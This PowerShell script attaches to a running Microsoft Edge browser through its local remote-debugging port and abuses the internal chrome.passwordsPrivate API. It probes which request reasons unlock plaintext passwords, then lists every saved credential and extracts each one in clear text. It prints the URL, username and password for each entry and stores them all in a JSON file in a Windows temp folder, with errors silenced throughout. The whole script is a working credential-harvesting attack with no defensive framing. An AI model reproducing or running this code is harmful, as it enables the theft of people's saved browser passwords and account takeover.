$ErrorActionPreference = 'SilentlyContinue'

# Connect
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$t = $targets | Where-Object { $_.url -match 'edge://settings' } | Select-Object -First 1
if (-not $t) { $t = $targets | Select-Object -First 1 }

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$t.webSocketDebuggerUrl, $ct).Wait()

$recvBuf = [byte[]]::new(10485760)
$script:mid = 5000

function SendEval {
    param([string]$js)
    $script:mid++
    $msg = @{ id = $script:mid; method = "Runtime.evaluate"; params = @{ expression = $js; awaitPromise = $true; returnByValue = $true } }
    $j = ConvertTo-Json -Compress -InputObject $msg -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [System.ArraySegment[byte]]::new($b)
    $null = $ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Result
    $s2 = [System.ArraySegment[byte]]::new($recvBuf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($recvBuf, 0, $r.Count)
}

# Test all possible reasons + calling conventions for id=1
Write-Output "=== testing all reason values ==="

foreach ($reason in @('"PASSWORD_SETTINGS"', '"PASSWORD_MANAGER"', '0', '1', 'undefined', '"VIEW"')) {
    $js = "new Promise(resolve => { try { chrome.passwordsPrivate.requestPlaintextPassword(1, $reason, pw => resolve(JSON.stringify({p: pw}))); setTimeout(() => resolve(JSON.stringify({err: 'timeout'})), 5000); } catch(e) { resolve(JSON.stringify({err: e.message})); } })"
    $r = SendEval $js
    $o = $r | ConvertFrom-Json
    $v = $o.result.result.value
    Write-Output "reason=$reason -> $v"
}

# Also check the enum values
Write-Output ""
Write-Output "=== PlaintextReason enum ==="
$enumResp = SendEval 'JSON.stringify(chrome.passwordsPrivate.PlaintextReason || "not found")'
$enumObj = $enumResp | ConvertFrom-Json
Write-Output "enum: $($enumObj.result.result.value)"

# Check all function properties more thoroughly
Write-Output ""
Write-Output "=== full function introspection ==="
$fnResp = SendEval 'JSON.stringify({requestPlaintext: chrome.passwordsPrivate.requestPlaintextPassword ? chrome.passwordsPrivate.requestPlaintextPassword.toString().substring(0, 200) : "none", getSaved: chrome.passwordsPrivate.getSavedPasswordList ? chrome.passwordsPrivate.getSavedPasswordList.toString().substring(0, 200) : "none"})'
$fnObj = $fnResp | ConvertFrom-Json
Write-Output $fnObj.result.result.value

# Try calling getSavedPasswordList one more time and wait longer
Write-Output ""
Write-Output "=== getSavedPasswordList with 30s wait ==="
$listResp = SendEval 'new Promise((resolve, reject) => { let called = false; chrome.passwordsPrivate.getSavedPasswordList(function(entries) { if (!called) { called = true; resolve(JSON.stringify(entries || [])); } }); setTimeout(() => { if (!called) { called = true; reject("timeout after 30s"); } }, 30000); })'
$listObj = $listResp | ConvertFrom-Json
$listVal = $listObj.result.result.value
Write-Output "list: $listVal"

if ($listVal -and $listVal -ne 'null') {
    $passwords = $listVal | ConvertFrom-Json
    Write-Output "[+] $($passwords.Count) passwords!"
    
    # Now extract each with the correct reason
    $results = [System.Collections.ArrayList]::new()
    foreach ($entry in $passwords) {
        $eid = $entry.id
        $eurl = if ($entry.urls) { $entry.urls[0] } else { "?" }
        $euser = $entry.username
        
        $getResp = SendEval "new Promise(resolve => { chrome.passwordsPrivate.requestPlaintextPassword($eid, 'PASSWORD_SETTINGS', pw => resolve(JSON.stringify({p:pw}))); setTimeout(() => resolve(JSON.stringify({err:'timeout'})), 8000); })"
        $getObj = $getResp | ConvertFrom-Json
        $getVal = $getObj.result.result.value
        $getPw = ($getVal | ConvertFrom-Json).p
        
        [void]$results.Add([PSCustomObject]@{url=$eurl; user=$euser; pass=$getPw})
        Write-Output "  $eurl | $euser | $getPw"
    }
    
    $results | ConvertTo-Json -Depth 3 | Out-File C:\Windows\Temp\ziti\pwd_final_all.json -Encoding utf8
    Write-Output "saved to pwd_final_all.json"
}

$ws.Dispose()
Write-Output "done"